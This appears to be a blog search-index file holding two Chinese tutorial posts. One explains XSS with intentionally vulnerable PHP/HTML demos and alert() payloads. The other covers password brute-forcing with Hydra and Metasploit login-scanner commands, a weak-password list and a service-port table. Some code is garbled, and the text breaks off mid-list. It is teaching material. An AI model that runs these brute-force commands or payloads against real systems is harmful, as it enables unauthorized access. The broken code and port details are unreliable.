<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS</title>
      <link href="/posts/undefined/sec5/"/>
      <url>/posts/undefined/sec5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>目标网站上注入JavaScript脚本 - - &gt; 跨站脚本攻击</p></blockquote><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><ul><li><p><strong>XSS 介绍</strong><br>Cross-Site Scripting (<strong>跨站脚本攻击</strong>）简称XSS，是一种代码注入攻击。攻击者通过<strong>在目标网站上注入恶意脚本，使之在用户的浏览器上运行</strong>。利用这些恶意脚本，攻击者可获取用户的敏感信息如Cookie、SessionID等，进而危害数据安全。</p></li><li><p><strong>XSS 原理</strong><br>XSS攻击指黑客通过特殊的手段往网页中插入了恶意的<strong>JavaScript脚本</strong>，从而在用户浏览网页时，对用户浏览器发起<strong>Cookie资料窃取、会话劫持、钓鱼欺骗</strong>等各攻击。<br>XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。</p></li></ul><p>XSS跨站脚本攻击漏洞也是OWASP Top 10中经常出现的对象，造成XSS漏洞普遍流行的原因如下:</p><ol><li><strong>Web浏览器</strong>本身的设计不安全，<strong>无法判断JS代码是否是恶意</strong>的</li><li>输入与输出的<strong>Web应用程序基本交互防护不够</strong></li><li>程序员++缺乏安全意识++，++缺少对XSS漏洞的认知++</li><li>4.XSS触发简单,完全防御起来相当困难</li></ol><ul><li>小彩蛋<br>看到黑客的钓鱼网站了 输入密码 <code>&lt;script&gt;alert(&#39;SB Hacker&#39;);&lt;/script&gt;</code>  将 script脚本 嵌入到网页中 恶心对方一下<br>如果被限制长度了别忘了 F12 改一下<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57bd9i1jyj30y8074dgl.jpg" alt="image.png"></li></ul><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><p>反射型 XSS （非持久型）<br>反射型跨站脚本(Reflected Cross-site Scripting)也称作非持久型、参数型跨站脚本。反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。</p><ul><li>假设一个页面把用户输入的参数直接输出到页面上:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span> [<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&quot;</span>.<span class="variable">$input</span>. <span class="string">&quot;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>用户向param提交的数据会展示到 <code>&lt;h1&gt;</code> 的标签中展示出来，比如提交:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?param=Hello xss</span><br></pre></td></tr></table></figure>会得到如下结果：<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57fu8jzldj30m50630tl.jpg" alt="image.png"></li></ul><p>此时查看页面源代码，可以看到：<br><code>&lt;h1&gt;Hello XSS&lt;/h1&gt;</code></p><p>此时如果提交一个JavaScript代码:<br><code>http://127.0.0.1/test.php?param=&lt;script&gt;alert(233)&lt;/script&gt;</code></p><p>会发现， alert(233) 在当亲页面执行了：<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57fxn6p7zj30mb09iab7.jpg" alt="image.png"></p><p>再查看源代码：<br><code>&lt;h1&gt;&lt;script&gt;alert(233)&lt;/script&gt;&lt;/h1&gt;</code></p><p>用户输入的Script脚本，已经被写入页面中，这个就是一个最经典的反射型XSS，它的特点是只在用户浏览时触发，而且只执行一次，非持久化，所以称为反射型XSS。反射型XSS的危害往往不如持久型XSS，因为恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发，稍微有点安全意识的用户可以轻易看穿该链接是不可信任的。如此一来，反射型XSS的攻击成本要比持k型XSS高得多，不过随着技术的发展，我们可以将包含漏洞的链接通过短网址缩短或者转换为二维码等形式灵活运用。</p><h3 id="存储xSS-持久型"><a href="#存储xSS-持久型" class="headerlink" title="存储xSS(持久型)"></a>存储xSS(持久型)</h3><p>存储型 XSS 和反射型 XSS 的差别仅在于∶提交的 XSS 代码会存储在服务端〈不管是数据库、内存还是文件系统等)，下次请求目标页面时不用再提交 XSS 代码。最典型的例子是留言板 XSS 。</p><p>为了复现存储型 XSS ，这里我们得用到数据库，本地新建一个名字叫做 XSS 的数据库，里面新建一个<code>message</code>表，用来存放用户的留言信息，字段名分别是 <code>id . username .message</code></p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57g6p36a7j30ih09ntbf.jpg" alt="image.png"></p><p>id 设为主键，并勾选自动递增，也可以参考下面的 sql语句来设计表: <strong>导入数据酷注意编码问题</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> NAMES utf8mb4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span>`message<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">CREATE TABLE &#x27;</span>message`(</span><br><span class="line"> `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line"> <span class="string">&#x27;username’ varchar(255)CHARACTER SET utf8 COLLATE utf8_general_ci NLL DEFAULT NOLL,</span></span><br><span class="line"><span class="string"> &#x27;</span>message’ <span class="type">varchar</span>(<span class="number">255</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line"> <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> MyISAM AUTO_INCREMENT <span class="operator">=</span> <span class="number">17</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8_general_ci ROw_F</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY__CHECKS <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>目前数据库方面设计完了，开始着手写 PHP 后端页面，来复现一下存储型 XSS 漏洞:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  <span class="comment">//不报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*数据库信息配置*/</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;localhost&quot;</span> ;<span class="comment">//数据库地址</span></span><br><span class="line"><span class="variable">$port</span> = <span class="string">&quot;3306&quot;</span>;      <span class="comment">//数据库端口</span></span><br><span class="line"><span class="variable">$user</span> = <span class="string">&quot;root&quot;</span>;      <span class="comment">//数据库用户名</span></span><br><span class="line"><span class="variable">$pwd</span> = <span class="string">&quot;root&quot;</span>;       <span class="comment">//数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;xss&quot;</span>;     <span class="comment">//数据库名</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>( <span class="variable">$host</span>,<span class="variable">$user</span> , <span class="variable">$pwd</span> , <span class="variable">$dbname</span> , <span class="variable">$port</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--前端用户输入表单--&gt;</span><br><span class="line">&lt;h1&gt;留言板的存储型XSS&lt;/h1&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;姓名&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;message&quot;</span> placeholder=<span class="string">&quot;请输入您的留言&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*直接将留言插入到数据库中*/</span></span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$message</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$username</span> <span class="keyword">and</span> <span class="variable">$message</span>)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="variable">$sql</span>=<span class="string">&quot;INSERT INTO ‘message&#x27;(&#x27;username&#x27;,&#x27;message&#x27;) VALUES (&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$messag&#125;</span>`)</span></span><br><span class="line"><span class="string">        if (<span class="subst">$conn</span>-&gt;query(<span class="subst">$sql</span>) === TRUE)&#123;</span></span><br><span class="line"><span class="string">            echo&quot;</span>留言成功<span class="string">&quot;. &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">       &#125; else &#123;</span></span><br><span class="line"><span class="string">           echo &quot;</span><span class="built_in">Error</span>: <span class="string">&quot; . <span class="subst">$sql</span> . &quot;</span>&lt;br&gt;<span class="string">&quot; . <span class="subst">$conn</span>-&gt;error;</span></span><br><span class="line"><span class="string">       )</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">    echo&quot;</span>请填写完整信息<span class="string">&quot;.&quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /*查询数据库中的留言信息*/</span></span><br><span class="line"><span class="string">    <span class="subst">$sql</span> = &quot;</span>SELECT username,message FROM message<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    <span class="subst">$result</span> = <span class="subst">$conn</span>-&gt;query(<span class="subst">$sql</span>);</span></span><br><span class="line"><span class="string">    if (<span class="subst">$result</span>-&gt;num_rows &gt; 0)&#123;</span></span><br><span class="line"><span class="string">       while(<span class="subst">$row</span> = <span class="subst">$result</span>-&gt;fetch_assoc()) &#123;</span></span><br><span class="line"><span class="string">          echo &quot;</span>用户名: <span class="string">&quot; .<span class="subst">$row</span>[ &quot;</span>username<span class="string">&quot;].&quot;</span>留言内容:<span class="string">&quot; . <span class="subst">$row</span> [ &quot;</span>message<span class="string">&quot; ] . &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string">    &#125;else &#123;</span></span><br><span class="line"><span class="string">    echo&quot;</span>暂无留言<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br></pre></td></tr></table></figure><p>将以上代码保存为 php文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面:</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57gw37z3mj30ez07pwgx.jpg" alt="image.png"></p><p>留言将会存到数据库当中</p><p>可以从代码看出，逻辑很简单，用户前端留言，就可以看到自己的留言信息了，代码中没有任何过滤，直接将用户的输入的语句插入到了html网页中，这样就很容易导致存储型xsS 漏洞的产生。<br>当攻击者直接在留言板块插入<code>&lt;script&gt;alert(&#39;鸡你太美&#39;)&lt;/script&gt;</code>，会<strong>导致这条恶意的语句直接插入到了数据库中，然后通过网页解析，成功触发了JS语句，导致用户浏览这个网页就会一直弹窗</strong>，<strong>除非从数据库中删除这条语句</strong>:</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57ja1f5psj30ll0dx774.jpg" alt="image.png"></p><p>此时查看下网页源码:</p><p><code>&lt;b&gt;用户名:&lt;/b&gt;XXX――&lt;b&gt;留言内容:&lt;/b&gt;&lt;script&gt;alert( &#39;鸡你太美&#39;)&lt;/script&gt;&lt;br&gt;</code></p><p>存储型 XSS 的攻击是<strong>最隐蔽的也是危害比较大</strong>的，普通用户所看的URL为 <code>http://127.0.0.1/test.php</code> ,从URL上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与JS解析执行，于是就触发了XSS攻击。</p><h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><ul><li><strong>DOM型不需要后端参与</strong></li></ul><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并<strong>不需要服务器解析响应的直接参与</strong>，触发XSS靠的就是浏览器端的DOM解析，可以认为<strong>完全是客户端</strong>的事情。</p><p>下面编写一个简单的含有DOM XSS漏洞的HTML代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;&quot;</span><span class="attr">UTF-8</span>&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">xss</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="property">getElementById</span> ( <span class="string">&quot;src&quot;</span> ).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">getElementById</span> ( <span class="string">&quot;demo&quot;</span> ) .<span class="property">innerHTML</span> = <span class="string">&quot;&lt;img src=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27; /&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&lt;/ script&gt;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;src&quot;</span> <span class="attr">size</span>=<span class="string">&quot;50&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入图片地址&quot;</span>/&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;插入&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;xss()&quot;</span> /&gt;</span></span>&lt;br&gt;</span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>将输入的图片插入到 src 中生成<br>页面会通过 <img> 标签将插入的图片显示在网页中</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57u55z7c8j30fm091dh5.jpg" alt="image.png"></p><p>同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候:</p><p><code>1&#39;onerror=alert(233)//</code></p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57u7luirsj30lt0l0af4.jpg" alt="image.png"></p><p>会直接在 <img> 标签中插入 onerror事件，该语句表示当图片加载出错的时候，自动触发后面的alert)函数，来达到弹窗的效果，这就是一个最简单的DOM型XSS漏洞。</p><ul><li><strong>漏洞出现的地方</strong><br>购物车 地址信息，网站配置文件，用户资料，论坛帖子发布，蚂蚁森林留言。<br>导致窃取cookie</li></ul><h3 id="XSS-平台"><a href="#XSS-平台" class="headerlink" title="XSS 平台"></a>XSS 平台</h3><ol><li>蓝莲花开源的 XSS</li><li>Kali Linux 自带的 Beef</li><li>自己动手，丰衣足食</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>认证技术</title>
      <link href="/posts/undefined/sec4/"/>
      <url>/posts/undefined/sec4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="认证技术"><a href="#认证技术" class="headerlink" title="认证技术"></a>认证技术</h1><p>身份认证技术是用于在计算机网络中确认操作者身份的一种有效的解决方法。计算机网络世界中一切信喜，包括用户的身份信息都是用一组特定的数据来表示的,计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。<br>身份认证攻击就是为了使用各种办法通过这层认证，<strong>突破作为防护网络资产的第一道关口</strong>，身份认证攻击在<strong>渗透测试</strong>中有着举足轻重的作用。<br>对于身份认证攻击可以直接进行爆破攻击，在配置不当的情况下内网中还会经常遇到非授权访问</p><h2 id="系统认证爆破"><a href="#系统认证爆破" class="headerlink" title="系统认证爆破"></a>系统认证爆破</h2><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><ul><li><strong>不怎么好用</strong><br><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></li></ul><p>俗称“九头蛇”，一款老牌的爆破工具</p><ul><li>常用命令</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FTP 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ftp:/ /192.168.0.1 -vV</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ssh: / /192.168.0.1 --vV</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB 爆破</span></span><br><span class="line">hydra -l admin -P password.txt 10.211.55.9 smb</span><br><span class="line"></span><br><span class="line"><span class="comment"># MSSQL 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P / root/password.txt 192.168.0.1 mssql -vv</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P / root/password.txt 192.168.0.1 mysql -vV</span><br></pre></td></tr></table></figure><ul><li>l：导入单个用户</li><li>L ：导入一个字典</li><li>p：导入一个密码</li><li>P：导入一个密码字典</li><li>Kali自带上述命令</li></ul><h4 id="SNETCracker"><a href="#SNETCracker" class="headerlink" title="SNETCracker"></a>SNETCracker</h4><ul><li>适合国情的内网爆破工具，安全从业者必备<br>超级弱口令检查工具是一款<strong>Windows平台的弱口令审计工具</strong>，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。</li></ul><blockquote><p>SSH登录发生异常! Could not load file or assembly ‘ChilkatDotNet4.dll’ or one of its dependencies.找不到指定的模块。这个错误是因为需要这个ssh模块需要vc++2010 32位得支持，下载安装就行了。RDP错误一般是<strong>线程</strong>过多，一般建议最好<strong>在10个以内</strong>，自己慢慢试，线程多了就会出问题。</p></blockquote><ul><li>支持 <strong>RDP</strong> 爆破 <strong>3389</strong><br>远程桌面协议RDP(Remote Display Protocol）是Windows的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到Windows计算机，默认端口为3389<br>暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般 Windows 服务器陌默认账户为administrator此外如果对方服务器开启了SMB445端口的话尽量优先爆破SMB（445），因为<em>RDP协议比较脆弱，经不起高速的爆破</em>。</li></ul><h4 id="御剑RDP爆破工具"><a href="#御剑RDP爆破工具" class="headerlink" title="御剑RDP爆破工具"></a>御剑RDP爆破工具</h4><ul><li>较为好用 在 github 中下架时查找历史提交记录下载</li></ul><h4 id="railgun"><a href="#railgun" class="headerlink" title="railgun"></a>railgun</h4><p><a href="https://github.com/z520520/railgun">https://github.com/z520520/railgun</a></p><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><ul><li><strong>Kali Linux系统内置Metasploit</strong>，它可以帮助用户识别安全问题，验证漏洞，并对某些软件进行安全评估，提供安全风险情报</li><li><strong>RAPID7</strong>团队出品。<strong>Offensive Security</strong>团队</li></ul><h3 id="国内常见弱口令"><a href="#国内常见弱口令" class="headerlink" title="国内常见弱口令"></a>国内常见弱口令</h3><table><thead><tr><th>Col1</th><th>Col2</th><th>Col3</th><th>Col4</th></tr></thead><tbody><tr><td>123abc</td><td>P@sswOrd</td><td>Huawei@123</td><td>mysql</td></tr><tr><td>123abc*123</td><td>P@sswOrd</td><td>Changme_123</td><td>oracle</td></tr><tr><td>123456</td><td>root@123</td><td>admin@123</td><td>root</td></tr><tr><td>abc123root123</td><td>root1234</td><td>admin</td><td>test</td></tr><tr><td>abc123456</td><td>oracle123!@#</td><td></td><td></td></tr></tbody></table><h3 id="常见爆破服务及端口号总结"><a href="#常见爆破服务及端口号总结" class="headerlink" title="常见爆破服务及端口号总结"></a>常见爆破服务及端口号总结</h3><table><thead><tr><th>服务名称</th><th>端口号</th><th>服务名称</th><th>端口号</th></tr></thead><tbody><tr><td>FTP</td><td>21</td><td>MySQL</td><td>3360</td></tr><tr><td>Telnet</td><td>23</td><td>RDP</td><td>3389</td></tr><tr><td>SMB</td><td>445</td><td>PostgreSQL</td><td>5432</td></tr><tr><td>MSSQL</td><td>1433</td><td>Redis</td><td>6379</td></tr><tr><td>Oracle</td><td>1521</td><td>Tomcat</td><td>8080</td></tr><tr><td>MongoDb</td><td>27017</td><td></td><td></td></tr></tbody></table><h3 id="爆破-21-FTP"><a href="#爆破-21-FTP" class="headerlink" title="爆破 21 FTP"></a>爆破 21 FTP</h3><p>FTP(File Transfer Protocol，<strong>文件传输协议</strong>)是TCP&#x2F;IP协议组中的协议之一。FTP协议包括两个组成部分，其一为<strong>FTP服务器</strong>，其二为<strong>FTP客户端</strong>。其中<strong>FTP服务器用来存储文件</strong>，用户司以使用<strong>FTP客户端通过FTP协议访问位于FTP服务器上的资源</strong>。</p><ul><li><strong>Docker快速搭建FTP环境:</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拉取镜像</span></span><br><span class="line">docker pull fauria/vsftpd</span><br><span class="line"></span><br><span class="line"><span class="comment">#构建容器</span></span><br><span class="line">docker run -d \-p 20:20 \</span><br><span class="line">-p 21:21 \</span><br><span class="line">-p 21100-21110:21100-21110 \-e FTP_USER=admin \</span><br><span class="line">-e FTP_PASS=admin \</span><br><span class="line">-e PASV_ADDRESS=10.20.24.244 \<span class="comment"># Docker 宿主机的 IP</span></span><br><span class="line">-e PASv_MIN_PORT=21100 \</span><br><span class="line">-e PASV_MAX_PORT=21100 \</span><br></pre></td></tr></table></figure><ul><li>Hydra</li><li><strong>超级弱口令爆破工具</strong></li><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/ftp/ftp_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.20.24.244set username admin</span><br><span class="line"><span class="built_in">set</span> pass_file /Users/sec/Documents/Sec/ hydra/password.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-23-Telnet-比较少见"><a href="#爆破-23-Telnet-比较少见" class="headerlink" title="爆破 23 Telnet 比较少见"></a>爆破 23 Telnet 比较少见</h3><p>Telnet 协议是 Internet 远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机.工作的能力。用户连接上Telnet之后可以直接输入命令，然后这些命令会在服务器上运行，就像直接在控制器的控制台上输入一样。默认端口为23</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/telnet/telnet_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.211.55.9</span><br><span class="line"><span class="built_in">set</span> user_file /Users/sec/Documents/Sec/hydra/user.txt</span><br><span class="line"><span class="built_in">set</span> pass_file /Users/sec/Documents/Sec /hydra/password.txt</span><br><span class="line"><span class="built_in">set</span> threds 5   <span class="comment">#线程</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>坑点记录</strong><br>超级弱口令工具 和 Hydra 爆破 TeInet 不太行，尽量<strong>使用 MSF 爆破TeInet</strong></li></ul><h3 id="爆破-445-SMB"><a href="#爆破-445-SMB" class="headerlink" title="爆破 445 SMB"></a>爆破 445 SMB</h3><p>SMB(Server Message Block) Windows协议，用于<strong>文件和打印共享服务</strong>。默认端口为445</p><ul><li>Hydra</li><li>超级弱口令爆破工具</li><li>railgun</li><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner / smb /smb_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> smbuser admin</span><br><span class="line"><span class="built_in">set</span> pass_file /root/password.txt</span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>坑点记录</strong></li><li><ol><li>超级弱口令工具在爆破高版本系统比如Windows 10就不太好用:</li></ol></li><li><ol><li>Hvdra也不太行:</li></ol></li><li><ol><li>但是此时MSF依然是可以爆破的:</li></ol></li><li><ol><li>另外 SMB爆破还与防火墙是否关闭有关系，总的来说SMB爆破首选 MSF 爆破Samba也,是可以使用MSF或者Hvdra 来讲行爆破的:</li></ol></li><li><ol><li>爆破Samba也,是可以使用MSF或者Hvdra 来讲行爆破的:<br>Samba是种用来让UNIX系列的操作系统与微软Windows 操作系统的SMB网络协议做链接的自由软件。第三版不仅可访问及分享SMB的文件夹及打印机，本身还可以集成入Windows Server的网域，扮演为网域控制站以及加入Active 